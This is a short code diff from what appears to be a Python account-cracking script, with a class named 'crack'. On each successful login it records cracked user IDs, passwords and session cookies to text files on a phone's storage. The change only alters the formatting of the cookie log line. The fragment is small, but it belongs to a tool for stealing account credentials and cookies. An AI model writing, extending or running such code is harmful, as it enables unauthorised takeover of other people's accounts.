@@ -964,7 +964,7 @@ class crack:
                         print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}  ")
                         #print(f"\r{HH}[#OK-GSXD] {used} | {pw} | {cokie} {VV} 			   ")
                         open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
+                        open("/sdcard/GS-2X-IDS/M3- IDS/M3-GSXD_COKIE.TXT", "a").write(used + "|" + pw + "|" + cokie + "	\n")
                         ok.append(used + pw)
                         break
                     except KeyError:
